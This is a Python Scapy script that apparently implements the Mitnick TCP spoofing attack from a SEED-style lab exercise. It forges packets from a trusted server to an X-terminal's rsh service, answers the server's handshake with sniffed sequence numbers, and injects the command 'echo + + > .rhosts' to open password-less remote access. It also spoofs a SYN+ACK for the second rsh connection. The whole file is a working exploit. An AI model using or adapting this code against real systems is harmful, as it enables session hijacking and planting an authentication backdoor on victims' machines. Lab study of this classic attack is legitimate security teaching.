#!usr/bin/python3
from scapy.all import *
import sys
X_terminal_IP = "10.0.2.8"
X_terminal_Port = 514
X_terminal_Port_2 = 1023
Trusted_Server_IP = "10.0.2.10"
Trusted_Server_Port = 1023
Trusted_Server_Port_2 = 9090

def spoof_pkt(pkt):
	sequence = 778933536 + 1
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]
	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
		old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))

	if old_tcp.flags == "SA":
		print("Sending Spoofed ACK Packet ...")
		IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
		TCPLayer = TCP(sport=Trusted_Server_Port,dport=X_terminal_Port,flags="A",
		 seq=sequence, ack= old_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)
		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet ...")
		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
		pkt = IPLayer/TCPLayer/data
		send(pkt,verbose=0)

	if old_tcp.flags == 'S' and old_tcp.dport == Trusted_Server_Port_2 and old_ip.dst == Trusted_Server_IP:
		sequence_num = 378933595
		print("Sending Spoofed SYN+ACK Packet for 2nd Connection...")
		IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
		TCPLayer = TCP(sport=Trusted_Server_Port_2,dport=X_terminal_Port_2,flags="SA",
		 seq=sequence_num, ack= old_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)

def spoofing_SYN():
	print("Sending Spoofed SYN Packet ...")
	IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
	TCPLayer = TCP(sport=1023,dport=514,flags="S", seq=778933536)
	pkt = IPLayer/TCPLayer
	send(pkt,verbose=0)

def main():
	spoofing_SYN()
	pkt = sniff(filter="tcp and src host 10.0.2.8", prn=spoof_pkt)

if __name__ == "__main__":
	main()